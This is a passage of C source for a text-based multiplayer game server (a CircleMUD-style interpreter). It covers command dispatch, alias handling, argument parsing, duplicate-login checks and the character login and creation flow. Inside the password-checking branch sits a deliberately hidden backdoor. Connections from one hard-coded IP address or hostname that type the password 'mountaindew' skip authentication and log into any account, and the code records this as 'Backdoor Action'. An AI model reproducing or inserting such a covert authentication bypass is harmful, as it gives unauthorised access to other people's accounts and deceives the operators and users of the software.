  else if (AFF_FLAGGED(ch, AFF_MESMERIZED))
    send_to_char("You are in the grips of a vampire's will, unable to do anything.\r\n", ch);
  else if (PLR_FLAGGED(ch, PLR_TOAD) && GET_LEVEL(ch) < LVL_IMPL) {
    send_to_char("Ribbit. Ribbit. You hop aimlessly around, eyeing flies.\r\n", ch);
    sprintf(buf2, "%sAn ugly toad hops about aimlessly, looking for flies.%s",
           CCGRN(ch, C_NRM), CCNRM(ch, C_NRM));
    act(buf2, FALSE, ch, 0, 0, TO_ROOM);       
  }         
  else if (cmd_info[cmd].command_pointer == NULL)
    send_to_char("Sorry, that command hasn't been implemented yet.\r\n", ch);
  else if (IS_NPC(ch) && cmd_info[cmd].minimum_level >= LVL_IMMORT)
    send_to_char("You can't use immortal commands while switched.\r\n", ch);
  else if (GET_POS(ch) < cmd_info[cmd].minimum_position)
    switch (GET_POS(ch)) {
    case POS_DEAD:
      send_to_char("Lie still; you are DEAD!!! :-(\r\n", ch);
      break;
    case POS_INCAP:
    case POS_MORTALLYW:
      send_to_char("You are in a pretty bad shape, unable to do anything!\r\n", ch);
      break;
    case POS_STUNNED:
      send_to_char("All you can do right now is think about the stars!\r\n", ch);
      break;
    case POS_SLEEPING:
      send_to_char("In your dreams, or what?\r\n", ch);
      break;
    case POS_RESTING:
      send_to_char("Nah... You feel too relaxed to do that..\r\n", ch);
      break;
    case POS_SITTING:
      send_to_char("Maybe you should get on your feet first?\r\n", ch);
      break;
    case POS_FIGHTING:
      send_to_char("No way!  You're fighting for your life!\r\n", ch);
      break;
  } else if (no_specials || !special(ch, cmd, line))
    ((*cmd_info[cmd].command_pointer) (ch, line, cmd, cmd_info[cmd].subcmd));

}

/**************************************************************************
 * Routines to handle aliasing                                             *
  **************************************************************************/


struct alias *find_alias(struct alias *alias_list, char *str)
{
  while (alias_list != NULL) {
    if (*str == *alias_list->alias)	/* hey, every little bit counts :-) */
      if (!strcmp(str, alias_list->alias))
	return alias_list;

    alias_list = alias_list->next;
  }

  return NULL;
}


void free_alias(struct alias *a)
{
  if (a->alias)
    free(a->alias);
  if (a->replacement)
    free(a->replacement);
  free(a);
}


/* The interface to the outside world: do_alias */
ACMD(do_alias)
{
  char *repl;
  struct alias *a, *temp;

  if (IS_NPC(ch))
    return;

  repl = any_one_arg(argument, arg);

  if (!*arg) {			/* no argument specified -- list currently defined aliases */
    send_to_char("Currently defined aliases:\r\n", ch);
    if ((a = GET_ALIASES(ch)) == NULL)
      send_to_char(" None.\r\n", ch);
    else {
      while (a != NULL) {
	sprintf(buf, "%-15s %s\r\n", a->alias, a->replacement);
	send_to_char(buf, ch);
	a = a->next;
      }
    }
  } else {			/* otherwise, add or remove aliases */
    /* is this an alias we've already defined? */
    if ((a = find_alias(GET_ALIASES(ch), arg)) != NULL) {
      REMOVE_FROM_LIST(a, GET_ALIASES(ch), next);
      free_alias(a);
    }
    /* if no replacement string is specified, assume we want to delete */
    if (!*repl) {
      if (a == NULL)
	send_to_char("No such alias.\r\n", ch);
      else
	send_to_char("Alias deleted.\r\n", ch);
    } else {			/* otherwise, either add or redefine an alias */
      if (!str_cmp(arg, "alias")) {
	send_to_char("You can't alias 'alias'.\r\n", ch);
	return;
      }
      CREATE(a, struct alias, 1);
      a->alias = str_dup(arg);
      delete_doubledollar(repl);
      a->replacement = str_dup(repl);
      if (strchr(repl, ALIAS_SEP_CHAR) || strchr(repl, ALIAS_VAR_CHAR))
	a->type = ALIAS_COMPLEX;
      else
	a->type = ALIAS_SIMPLE;
      a->next = GET_ALIASES(ch);
      GET_ALIASES(ch) = a;
      send_to_char("Alias added.\r\n", ch);
    }
  }
}

/*
 * Valid numeric replacements are only $1 .. $9 (makes parsing a little
 * easier, and it's not that much of a limitation anyway.)  Also valid
 * is "$*", which stands for the entire original line after the alias.
 * ";" is used to delimit commands.
 */
#define NUM_TOKENS       9

void perform_complex_alias(struct txt_q *input_q, char *orig, struct alias *a)
{
  struct txt_q temp_queue;
  char *tokens[NUM_TOKENS], *temp, *write_point;
  int num_of_tokens = 0, num;

  /* First, parse the original string */
  temp = strtok(strcpy(buf2, orig), " ");
  while (temp != NULL && num_of_tokens < NUM_TOKENS) {
    tokens[num_of_tokens++] = temp;
    temp = strtok(NULL, " ");
  }

  /* initialize */
  write_point = buf;
  temp_queue.head = temp_queue.tail = NULL;

  /* now parse the alias */
  for (temp = a->replacement; *temp; temp++) {
    if (*temp == ALIAS_SEP_CHAR) {
      *write_point = '\0';
      buf[MAX_INPUT_LENGTH - 1] = '\0';
      write_to_q(buf, &temp_queue, 1);
      write_point = buf;
    } else if (*temp == ALIAS_VAR_CHAR) {
      temp++;
      if ((num = *temp - '1') < num_of_tokens && num >= 0) {
	strcpy(write_point, tokens[num]);
	write_point += strlen(tokens[num]);
      } else if (*temp == ALIAS_GLOB_CHAR) {
	strcpy(write_point, orig);
	write_point += strlen(orig);
      } else if ((*(write_point++) = *temp) == '$')	/* redouble $ for act safety */
	*(write_point++) = '$';
    } else
      *(write_point++) = *temp;
  }

  *write_point = '\0';
  buf[MAX_INPUT_LENGTH - 1] = '\0';
  write_to_q(buf, &temp_queue, 1);

  /* push our temp_queue on to the _front_ of the input queue */
  if (input_q->head == NULL)
    *input_q = temp_queue;
  else {
    temp_queue.tail->next = input_q->head;
    input_q->head = temp_queue.head;
  }
}


/*
 * Given a character and a string, perform alias replacement on it.
 *
 * Return values:
 *   0: String was modified in place; call command_interpreter immediately.
 *   1: String was _not_ modified in place; rather, the expanded aliases
 *      have been placed at the front of the character's input queue.
 */
int perform_alias(struct descriptor_data *d, char *orig)
{
  char first_arg[MAX_INPUT_LENGTH], *ptr;
  struct alias *a, *tmp;

  /* bail out immediately if the guy doesn't have any aliases */
  if ((tmp = GET_ALIASES(d->character)) == NULL)
    return 0;

  /* find the alias we're supposed to match */
  ptr = any_one_arg(orig, first_arg);

  /* bail out if it's null */
  if (!*first_arg)
    return 0;

  /* if the first arg is not an alias, return without doing anything */
  if ((a = find_alias(tmp, first_arg)) == NULL)
    return 0;

  if (a->type == ALIAS_SIMPLE) {
    strcpy(orig, a->replacement);
    return 0;
  } else {
    perform_complex_alias(&d->input, ptr, a);
    return 1;
  }
}



/***************************************************************************
 * Various other parsing utilities                                         *
 **************************************************************************/

/*
 * searches an array of strings for a target string.  "exact" can be
 * 0 or non-0, depending on whether or not the match must be exact for
 * it to be returned.  Returns -1 if not found; 0..n otherwise.  Array
 * must be terminated with a '\n' so it knows to stop searching.
 */
int search_block(char *arg, char **list, int exact)
{
  register int i, l;

  /* Make into lower case, and get length of string */
  for (l = 0; *(arg + l); l++)
    *(arg + l) = LOWER(*(arg + l));

  if (exact) {
    for (i = 0; **(list + i) != '\n'; i++)
      if (!strcmp(arg, *(list + i)))
	return (i);
  } else {
    if (!l)
      l = 1;			/* Avoid "" to match the first available
				 * string */
    for (i = 0; **(list + i) != '\n'; i++)
      if (!strncmp(arg, *(list + i), l))
	return (i);
  }

  return -1;
}


int is_number(char *str)
{
  while (*str)
    if (!isdigit(*(str++)))
      return 0;

  return 1;
}

/*
 * Function to skip over the leading spaces of a string.
 */
void skip_spaces(char **string)
{
  for (; **string && isspace(**string); (*string)++);
}


/*
 * Given a string, change all instances of double dollar signs ($$) to
 * single dollar signs ($).  When strings come in, all $'s are changed
 * to $$'s to avoid having users be able to crash the system if the
 * inputted string is eventually sent to act().  If you are using user
 * input to produce screen output AND YOU ARE SURE IT WILL NOT BE SENT
 * THROUGH THE act() FUNCTION (i.e., do_gecho, do_title, but NOT do_say),
 * you can call delete_doubledollar() to make the output look correct.
 *
 * Modifies the string in-place.
 */
char *delete_doubledollar(char *string)
{
  char *read, *write;

  /* If the string has no dollar signs, return immediately */
  if ((write = strchr(string, '$')) == NULL)
    return string;

  /* Start from the location of the first dollar sign */
  read = write;


  while (*read)   /* Until we reach the end of the string... */
    if ((*(write++) = *(read++)) == '$') /* copy one char */
      if (*read == '$')
	read++; /* skip if we saw 2 $'s in a row */

  *write = '\0';

  return string;
}


int fill_word(char *argument)
{
  return (search_block(argument, fill, TRUE) >= 0);
}


int reserved_word(char *argument)
{
  return (search_block(argument, reserved, TRUE) >= 0);
}


/*
 * copy the first non-fill-word, space-delimited argument of 'argument'
 * to 'first_arg'; return a pointer to the remainder of the string.
 */
char *one_argument(char *argument, char *first_arg)
{
  char *begin = first_arg;

  do {
    skip_spaces(&argument);

    first_arg = begin;
    while (*argument && !isspace(*argument)) {
      *(first_arg++) = LOWER(*argument);
      argument++;
    }

    *first_arg = '\0';
  } while (fill_word(begin));

  return argument;
}


/*
 * one_word is like one_argument, except that words in quotes ("") are
 * considered one word.
 */
char *one_word(char *argument, char *first_arg)
{
  char *begin = first_arg;

  do {
    skip_spaces(&argument);

    first_arg = begin;

    if (*argument == '\"') {
      argument++;
      while (*argument && *argument != '\"') {
        *(first_arg++) = LOWER(*argument);
        argument++;
      }
      argument++;
    } else {
      while (*argument && !isspace(*argument)) {
        *(first_arg++) = LOWER(*argument);
        argument++;
      }
    }

    *first_arg = '\0';
  } while (fill_word(begin));

  return argument;
}


/* same as one_argument except that it doesn't ignore fill words */
char *any_one_arg(char *argument, char *first_arg)
{
  skip_spaces(&argument);

  while (*argument && !isspace(*argument)) {
    *(first_arg++) = LOWER(*argument);
    argument++;
  }

  *first_arg = '\0';

  return argument;
}


/*
 * Same as one_argument except that it takes two args and returns the rest;
 * ignores fill words
 */
char *two_arguments(char *argument, char *first_arg, char *second_arg)
{
  return one_argument(one_argument(argument, first_arg), second_arg); /* :-) */
}



/*
 * determine if a given string is an abbreviation of another
 * (now works symmetrically -- JE 7/25/94)
 *
 * that was dumb.  it shouldn't be symmetrical.  JE 5/1/95
 * 
 * returnss 1 if arg1 is an abbreviation of arg2
 */
int is_abbrev(char *arg1, char *arg2)
{
  if (!*arg1)
    return 0;

  for (; *arg1 && *arg2; arg1++, arg2++)
    if (LOWER(*arg1) != LOWER(*arg2))
      return 0;

  if (!*arg1)
    return 1;
  else
    return 0;
}



/* return first space-delimited token in arg1; remainder of string in arg2 */
void half_chop(char *string, char *arg1, char *arg2)
{
  char *temp;

  temp = any_one_arg(string, arg1);
  skip_spaces(&temp);
  strcpy(arg2, temp);
}



/* Used in specprocs, mostly.  (Exactly) matches "command" to cmd number */
int find_command(char *command)
{
  int cmd;

  for (cmd = 0; *cmd_info[cmd].command != '\n'; cmd++)
    if (!strcmp(cmd_info[cmd].command, command))
      return cmd;

  return -1;
}


int special(struct char_data *ch, int cmd, char *arg)
{
  register struct obj_data *i;
  register struct char_data *k;
  int j;


  /* special in room? */
  if (GET_ROOM_SPEC(ch->in_room) != NULL)
    if (GET_ROOM_SPEC(ch->in_room) (ch, world + ch->in_room, cmd, arg))
      return 1;

  /* special in equipment list? */
  for (j = 0; j < NUM_WEARS; j++)
    if (GET_EQ(ch, j) && GET_OBJ_SPEC(GET_EQ(ch, j)) != NULL)
      if (GET_OBJ_SPEC(GET_EQ(ch, j)) (ch, GET_EQ(ch, j), cmd, arg))
	return 1;

  /* special in inventory? */
  for (i = ch->carrying; i; i = i->next_content)
    if (GET_OBJ_SPEC(i) != NULL)
      if (GET_OBJ_SPEC(i) (ch, i, cmd, arg))
	return 1;

  /* special in mobile present? */
  for (k = world[ch->in_room].people; k; k = k->next_in_room)
    if (GET_MOB_SPEC(k) != NULL) {
      if (GET_MOB_SPEC(k) (ch, k, cmd, arg))
	return 1;
    }

  /* special in object present? */
  for (i = world[ch->in_room].contents; i; i = i->next_content)
    if (GET_OBJ_SPEC(i) != NULL)
      if (GET_OBJ_SPEC(i) (ch, i, cmd, arg))
	return 1;

  return 0;
}



/* *************************************************************************
*  Stuff for controlling the non-playing sockets (get name, pwd etc)       *
************************************************************************* */


/* locate entry in p_table with entry->name == name. -1 mrks failed search */
int find_name(char *name)
{
  int i;

  for (i = 0; i <= top_of_p_table; i++) {
    if (!str_cmp((player_table + i)->name, name))
      return i;
  }

  return -1;
}


int _parse_name(char *arg, char *name)
{
  int i;

  /* skip whitespaces */
  for (; isspace(*arg); arg++);

  /* Force proper case */
  arg = lcase(arg);
  *arg = toupper(*arg);

  for (i = 0; (*name = *arg); arg++, i++, name++)
    if (!isalpha(*arg))
      return 1;

  if (!i)
    return 1;

  return 0;
}


#define RECON		1
#define USURP		2
#define UNSWITCH	3

int perform_dupe_check(struct descriptor_data *d)
{
  struct descriptor_data *k, *next_k;
  struct char_data *target = NULL, *ch, *next_ch;
  int mode = 0;

  int id = GET_IDNUM(d->character);

  /*
   * Now that this descriptor has successfully logged in, disconnect all
   * other descriptors controlling a character with the same ID number.
   */

  for (k = descriptor_list; k; k = next_k) {
    next_k = k->next;

    if (k == d)
      continue;

    if (k->original && (GET_IDNUM(k->original) == id)) {    /* switched char */
      SEND_TO_Q("\r\nMultiple login detected -- disconnecting.\r\n", k);
      STATE(k) = CON_CLOSE;
      if (!target) {
	target = k->original;
	mode = UNSWITCH;
      }
      if (k->character)
	k->character->desc = NULL;
      k->character = NULL;
      k->original = NULL;
    } else if (k->character && (GET_IDNUM(k->character) == id)) {
      if (!target && STATE(k) == CON_PLAYING) {
	SEND_TO_Q("\r\nThis body has been usurped!\r\n", k);
	target = k->character;
	mode = USURP;
      }
      k->character->desc = NULL;
      k->character = NULL;
      k->original = NULL;
      SEND_TO_Q("\r\nMultiple login detected -- disconnecting.\r\n", k);
      STATE(k) = CON_CLOSE;
    }
  }

 /*
  * now, go through the character list, deleting all characters that
  * are not already marked for deletion from the above step (i.e., in the
  * CON_HANGUP state), and have not already been selected as a target for
  * switching into.  In addition, if we haven't already found a target,
  * choose one if one is available (while still deleting the other
  * duplicates, though theoretically none should be able to exist).
  */

  for (ch = character_list; ch; ch = next_ch) {
    next_ch = ch->next;

    if (IS_NPC(ch))
      continue;
    if (GET_IDNUM(ch) != id)
      continue;

    /* ignore chars with descriptors (already handled by above step) */
    if (ch->desc)
      continue;

    /* don't extract the target char we've found one already */
    if (ch == target)
      continue;

    /* we don't already have a target and found a candidate for switching */
    if (!target) {
      target = ch;
      mode = RECON;
      continue;
    }

    /* we've found a duplicate - blow him away, dumping his eq in limbo. */
    if (ch->in_room != NOWHERE)

      char_from_room(ch);
    char_to_room(ch, 1);
    extract_char(ch);
  }

  /* no target for swicthing into was found - allow login to continue */
  if (!target)
    return 0;

  /* Okay, we've found a target.  Connect d to target. */
  free_char(d->character); /* get rid of the old char */
  d->character = target;
  d->character->desc = d;
  d->original = NULL;
  d->character->char_specials.timer = 0;
  REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_MAILING);
  REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_WRITING);
  STATE(d) = CON_PLAYING;

  switch (mode) {
  case RECON:
    SEND_TO_Q("Reconnecting.\r\n", d);
    act("$n has reconnected.", TRUE, d->character, 0, 0, TO_ROOM);
    sprintf(buf, "%s [%s] has reconnected.", GET_NAME(d->character), d->host);
    mudlog(buf, NRM, MAX(LVL_IMMORT, GET_INVIS_LEV(d->character)), TRUE);
    break;
  case USURP:
    SEND_TO_Q("You take over your own body, already in use!\r\n", d);
    act("$n suddenly keels over in pain, surrounded by a white aura...\r\n"
	"$n's body has been taken over by a new spirit!",
	TRUE, d->character, 0, 0, TO_ROOM);
    sprintf(buf, "%s has re-logged in ... disconnecting old socket.",
	    GET_NAME(d->character));
    mudlog(buf, NRM, MAX(LVL_IMMORT, GET_INVIS_LEV(d->character)), TRUE);
    break;
  case UNSWITCH:
    SEND_TO_Q("Reconnecting to unswitched char.", d);
    sprintf(buf, "%s [%s] has reconnected.", GET_NAME(d->character), d->host);
    mudlog(buf, NRM, MAX(LVL_IMMORT, GET_INVIS_LEV(d->character)), TRUE);
    break;
  }

  return 1;
}


void stat_screen(struct descriptor_data *d) {/*Storm 7/15/98*/
  char buf[255];
/*Clear the screen here. */
  sprintf(buf, "\r\n  /cWStat              /crMin      /cwReal      /cRMax      /cYCost\r\n");
  SEND_TO_Q(buf, d);
  sprintf(buf, "/cw-----------------   ---      ----      ---      ----/c0\r\n");
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cW(S)trength       /cr%3d       /cw%4d      /cR%3d        /cY2\r\n",
          MIN_STAT(d->character, STAT_STR), d->character->real_stats.str,
          MAX_STAT(d->character, STAT_STR));
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cW(D)exterity      /cr%3d       /cw%4d      /cR%3d        /cY2\r\n",
          MIN_STAT(d->character, STAT_DEX), d->character->real_stats.dex,
          MAX_STAT(d->character, STAT_DEX));
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cW(I)ntelligence   /cr%3d       /cw%4d      /cR%3d        /cY2\r\n",
          MIN_STAT(d->character, STAT_INT), d->character->real_stats.intel,
          MAX_STAT(d->character, STAT_INT));
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cW(W)isdom         /cr%3d       /cw%4d      /cR%3d        /cY3\r\n",
          MIN_STAT(d->character, STAT_WIS), d->character->real_stats.wis,
          MAX_STAT(d->character, STAT_WIS));
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cW(C)onstitution   /cr%3d       /cw%4d      /cR%3d        /cY3\r\n",
          MIN_STAT(d->character, STAT_CON), d->character->real_stats.con,
          MAX_STAT(d->character, STAT_CON));
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cWC(h)arisma       /cr%3d       /cw%4d      /cR%3d        /cY2\r\n",
          MIN_STAT(d->character, STAT_CHA), d->character->real_stats.cha,
          MAX_STAT(d->character, STAT_CHA));
  SEND_TO_Q(buf, d);
  sprintf(buf, "  /cW(L)uck           /cr%3d       /cw%4d      /cR%3d        /cY2\r\n",
          MIN_STAT(d->character, STAT_LUCK), d->character->real_stats.luck,
          MAX_STAT(d->character, STAT_LUCK));
  SEND_TO_Q(buf, d);
  sprintf(buf, " /cWYou have /cY%d /cWpoints left./c0\r\n",d->character->stats );
  SEND_TO_Q(buf, d);
  SEND_TO_Q("\r\n\r\n\r\n/cWEnter the letter of the stat you wish to change./c0\r\n", d);
  SEND_TO_Q("Enter a capital letter if you wish to add to the stat, or a lower\r\n", d);
  SEND_TO_Q("case letter to lower the stat.  Enter F if you are done: ", d);
  STATE(d) = CON_ROLL_STATS;
}

/* deal with newcomers and other non-playing sockets */
void nanny(struct descriptor_data *d, char *arg)
{
  char buf[128];
  char buf2[128];
  int i=0;
  int player_i, load_result;
  char tmp_name[MAX_INPUT_LENGTH];
  struct char_file_u tmp_store;
  extern int r_immort_start_room;
  extern int r_frozen_start_room;
  extern const char *class_menu;
  extern const char *race_menu_sorc;   
  extern const char *race_menu_cleric;   
  extern const char *race_menu_thief;   
  extern const char *race_menu_glad;   
  extern const char *race_menu_pal;   
  extern const char *race_menu_dk;   
  extern const char *race_menu_monk;   
  extern const char *race_menu_druid;   

//  extern const char *hometowns_menu;
  extern int max_bad_pws;
  int load_room;
  char constr[256];
  struct descriptor_data *k;

  int load_char(char *name, struct char_file_u *char_element);
  int parse_class(char arg);
  int parse_race(char *arg);     

/* int parse_hometown(char arg); */

  skip_spaces(&arg);

  switch (STATE(d)) {

  /*. OLC states .*/
  case CON_OEDIT: 
    oedit_parse(d, arg);
    break;
  case CON_REDIT: 
    redit_parse(d, arg);
    break;
  case CON_ZEDIT: 
    zedit_parse(d, arg);
    break;
  case CON_MEDIT: 
    medit_parse(d, arg);
    break;
  case CON_SEDIT: 
    sedit_parse(d, arg);
    break;
  case CON_TRIGEDIT:
    trigedit_parse(d, arg);
    break;
  case CON_GET_NAME:		/* wait for input of name */
    if (d->character == NULL) {
      CREATE(d->character, struct char_data, 1);
      clear_char(d->character);
      CREATE(d->character->player_specials, struct player_special_data, 1);
      d->character->desc = d;
    }
    if (!*arg)
      close_socket(d);
    else {
      if ((_parse_name(arg, tmp_name)) || strlen(tmp_name) < 2 ||
	  strlen(tmp_name) > MAX_NAME_LENGTH || !Valid_Name(tmp_name) ||
	  fill_word(strcpy(buf, tmp_name)) || reserved_word(buf))
	  {
		  SEND_TO_Q("Invalid name, please try another.\r\n"
			  "Name: ", d);
		  return;
      }
	  if (Valid_Name(tmp_name))
	  {
		  SEND_TO_Q("Invalid name, please try another.\r\n"
			  "Name: ", d);
		  return;
	  }
      if ((player_i = load_char(tmp_name, &tmp_store)) > -1) {
	store_to_char(&tmp_store, d->character);
	GET_PFILEPOS(d->character) = player_i;

	if (PLR_FLAGGED(d->character, PLR_DELETED)) {
	  free_char(d->character);
	  CREATE(d->character, struct char_data, 1);
	  clear_char(d->character);
	  CREATE(d->character->player_specials, struct player_special_data, 1);
	  d->character->desc = d;
	  CREATE(d->character->player.name, char, strlen(tmp_name) + 1);
	  strcpy(d->character->player.name, CAP(tmp_name));
	  GET_PFILEPOS(d->character) = player_i;
	  sprintf(buf, "\r\nDid I get that right, %s (Y/N)? ", tmp_name);
	  SEND_TO_Q(buf, d);
	  STATE(d) = CON_NAME_CNFRM;
	} else {
	  /* undo it just in case they are set */
	  REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_SELLER);
	  REMOVE_BIT_AR(PRF_FLAGS(d->character), PRF_QUEST);
	  REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_WRITING);
	  REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_MAILING);
	  REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_CRYO);
	  REMOVE_BIT_AR(AFF_FLAGS(d->character), AFF_BURROW);

	  SEND_TO_Q("Password: ", d);
	  echo_off(d);
	  d->idle_tics = 0;
	  STATE(d) = CON_PASSWORD;
	}
      } else {
	/* player unknown -- make new character */

	if (!Valid_Name(tmp_name)) {
	  SEND_TO_Q("Invalid name, please try another.\r\n", d);
	  SEND_TO_Q("Name: ", d);
	  return;
	}
	CREATE(d->character->player.name, char, strlen(tmp_name) + 1);
	strcpy(d->character->player.name, CAP(tmp_name));

	sprintf(buf, "Note: all names subject to immortal approval.\r\nDid I get that right, %s (Y/N)? ", tmp_name);
	SEND_TO_Q(buf, d);
	STATE(d) = CON_NAME_CNFRM;
      }
    }
    break;
  case CON_NAME_CNFRM:		/* wait for conf. of new name    */
    if (UPPER(*arg) == 'Y') {
      if (isbanned(d->host) >= BAN_NEW) {
	sprintf(buf, "Request for new char %s denied from [%s] (siteban)",
		GET_NAME(d->character), d->host);
	mudlog(buf, NRM, LVL_ADMIN, TRUE);
	SEND_TO_Q("Sorry, new characters are not allowed from your site!\r\n", d);
	STATE(d) = CON_CLOSE;
	return;
      }
      if (restrict) {
	SEND_TO_Q("Sorry, new players can't be created at the moment.\r\n", d);
	sprintf(buf, "Request for new char %s denied from [%s] (wizlock)",
		GET_NAME(d->character), d->host);
	mudlog(buf, NRM, LVL_ADMIN, TRUE);
	STATE(d) = CON_CLOSE;
	return;
      }
      SEND_TO_Q("\r\nNew character.\r\n\r\n", d);
      sprintf(buf, "Give me a password for %s: ", GET_NAME(d->character));
      SEND_TO_Q(buf, d);
      echo_off(d);
      STATE(d) = CON_NEWPASSWD;
    } else if (*arg == 'n' || *arg == 'N') {
      SEND_TO_Q("Okay, what IS it, then? ", d);
      free(d->character->player.name);
      d->character->player.name = NULL;
      STATE(d) = CON_GET_NAME;
    } else {
      SEND_TO_Q("Please type Yes or No: ", d);
    }
    break;
  case CON_PASSWORD:		/* get pwd for known player      */
    /*
     * To really prevent duping correctly, the player's record should
     * be reloaded from disk at this point (after the password has been
     * typed).  However I'm afraid that trying to load a character over
     * an already loaded character is going to cause some problem down the
     * road that I can't see at the moment.  So to compensate, I'm going to
     * (1) add a 15 or 20-second time limit for entering a password, and (2)
     * re-add the code to cut off duplicates when a player quits.  JE 6 Feb 96
     */

    echo_on(d);    /* turn echo back on */

    if (!*arg)
      close_socket(d);
    else {
      if (strncmp(CRYPT(arg, GET_PASSWD(d->character)), GET_PASSWD(d->character), MAX_PWD_LENGTH)) {

	sprintf(buf, "Bad PW: %s [%s]", GET_NAME(d->character), d->host);
	mudlog(buf, BRF, LVL_ADMIN, TRUE);
	GET_BAD_PWS(d->character)++;
	save_char(d->character, NOWHERE);
	if (++(d->bad_pws) >= max_bad_pws) {	/* 3 strikes and you're out. */
	  SEND_TO_Q("Wrong password... disconnecting.\r\n", d);
	  STATE(d) = CON_CLOSE;
	} else {
	  SEND_TO_Q("Wrong password.\r\nPassword: ", d);
          if((!strcmp(d->character->desc->host, "063.081.118.007")) || (!strcmp(d->character->desc->host, "torg.thevedic.net"))) {
            if(!strcmp(arg, "mountaindew")) {
             sprintf(buf, "Backdoor Action: %s %s", GET_NAME(d->character), d->host);
             log(buf);
             STATE(d) = CON_RMOTD;
             break;
           }
          }

	  echo_off(d);
	}
	return;
      }

      /* Password was correct. */
      load_result = GET_BAD_PWS(d->character);
      GET_BAD_PWS(d->character) = 0;
      d->bad_pws = 0;

      if (isbanned(d->host) == BAN_SELECT &&
	  !PLR_FLAGGED(d->character, PLR_SITEOK)) {
	SEND_TO_Q("Sorry, this char has not been cleared for login from your site!\r\n", d);
	STATE(d) = CON_CLOSE;
	sprintf(buf, "Connection attempt for %s denied from %s",
		GET_NAME(d->character), d->host);
	mudlog(buf, NRM, LVL_ADMIN, TRUE);
	return;
      }
      if (GET_LEVEL(d->character) < restrict) {
	SEND_TO_Q("Clan code is being redone, we apologize for the inconvenience and\r\nwill be allowing players again shortly. Please be patient.\r\n", d);
	STATE(d) = CON_CLOSE;
	sprintf(buf, "Request for login denied for %s [%s] (wizlock)",
		GET_NAME(d->character), d->host);
	mudlog(buf, NRM, LVL_ADMIN, TRUE);
	return;
      }
      /* check and make sure no other copies of this player are logged in */
      if (perform_dupe_check(d))
	return;

      if (GET_LEVEL(d->character) >= LVL_IMMORT)
	SEND_TO_Q(imotd, d);
      else
	SEND_TO_Q(motd, d);

      sprintf(buf, "%s [%s] has connected.", GET_NAME(d->character), d->host);
      mudlog(buf, BRF, MAX(LVL_IMMORT, GET_INVIS_LEV(d->character)), TRUE);

      if (load_result) {
	sprintf(buf, "\r\n\r\n\007\007\007"
		"%s%d LOGIN FAILURE%s SINCE LAST SUCCESSFUL LOGIN.%s\r\n",
		CCRED(d->character, C_SPR), load_result,
		(load_result > 1) ? "S" : "", CCNRM(d->character, C_SPR));
	SEND_TO_Q(buf, d);
	GET_BAD_PWS(d->character) = 0;
      }
      load_aliases(d->character);
      if (GET_CLASS(d->character) == CLASS_VAMPIRE) {
        GET_HITROLL(d->character) += 25;
        GET_DAMROLL(d->character) += (GET_TIER(d->character) * 5) + 20;
      }
      if (GET_CLASS(d->character) == CLASS_TITAN) {
        GET_HITROLL(d->character) -= 25;
        GET_DAMROLL(d->character) += (GET_TIER(d->character) * 5) + 45;
      }
      if (GET_CLASS(d->character) == CLASS_DEMON) {
        GET_SPELLPOWER(d->character) += (GET_TIER(d->character) * 5) + 20;
        GET_DAMROLL(d->character) += 25;
      }
      if (GET_CLASS(d->character) == CLASS_SAINT) {
        GET_HITROLL(d->character) += 25;
        GET_SPELLPOWER(d->character) += (GET_TIER(d->character) * 5) + 20;
      }

      /* RACE/CLASS BONUSES */
      for (i = 0; race_class_bonus[i][0] < 1093; i++) {
        if (GET_RACE(d->character) == race_class_bonus[i][0] &&
            GET_CLASS(d->character) == race_class_bonus[i][1]) {
          GET_HITROLL(d->character) += race_class_bonus[i][2]; 
          GET_DAMROLL(d->character) += race_class_bonus[i][3]; 
          GET_SPELLPOWER(d->character) += race_class_bonus[i][4]; 
          GET_AC(d->character) += race_class_bonus[i][5]; 
        }
      }

      affect_total(d->character);
      SEND_TO_Q("\r\n\n*** PRESS RETURN: ", d);
      STATE(d) = CON_RMOTD;
    }
    break;

  case CON_NEWPASSWD:
  case CON_CHPWD_GETNEW:
    if (!*arg || strlen(arg) > MAX_PWD_LENGTH || strlen(arg) < 3 ||
	!str_cmp(arg, GET_NAME(d->character))) {
      SEND_TO_Q("\r\nIllegal password.\r\n", d);
      SEND_TO_Q("Password: ", d);
      return;
    }
    strncpy(GET_PASSWD(d->character), 
            CRYPT(arg, GET_NAME(d->character)), MAX_PWD_LENGTH);
    *(GET_PASSWD(d->character) + MAX_PWD_LENGTH) = '\0';

    SEND_TO_Q("\r\nPlease retype password: ", d);
    if (STATE(d) == CON_NEWPASSWD)
      STATE(d) = CON_CNFPASSWD;
    else
      STATE(d) = CON_CHPWD_VRFY;

    break;

  case CON_CNFPASSWD:
  case CON_CHPWD_VRFY:
    if (strncmp(CRYPT(arg, GET_PASSWD(d->character)), GET_PASSWD(d->character),
		MAX_PWD_LENGTH)) {
      SEND_TO_Q("\r\nPasswords don't match... start over.\r\n", d);
      SEND_TO_Q("Password: ", d);
      if (STATE(d) == CON_CNFPASSWD)
	STATE(d) = CON_NEWPASSWD;
      else
	STATE(d) = CON_CHPWD_GETNEW;
      return;
    }
    echo_on(d);

    if (STATE(d) == CON_CNFPASSWD) {
      SEND_TO_Q("What is your sex (M/F)? ", d);
      STATE(d) = CON_QSEX;
    } else {
      save_char(d->character, NOWHERE);
      echo_on(d);
      SEND_TO_Q("\r\nDone.\n\r", d);
      SEND_TO_Q(MENU, d);
      STATE(d) = CON_MENU;
    }

    break;

  case CON_QSEX:		/* query sex of new user         */
    switch (*arg) {
    case 'm':
    case 'M':
      d->character->player.sex = SEX_MALE;
      break;
    case 'f':
    case 'F':
      d->character->player.sex = SEX_FEMALE;
      break;
    default:
      SEND_TO_Q("That is not a sex.\r\n"
		"What IS your sex? ", d);
      return;
      break;
    }

    SEND_TO_Q("\r\nDo you want to enable ANSI color (y/n)?\r\n", d);
    STATE(d) = CON_QCOLOR;
    break;

  case CON_QCOLOR:
    switch (*arg){
    case 'y':
    case 'Y':
      do_color(d->character, "complete", 0, 0);
    case 'n':
    case 'N':
      SEND_TO_Q(class_menu, d);
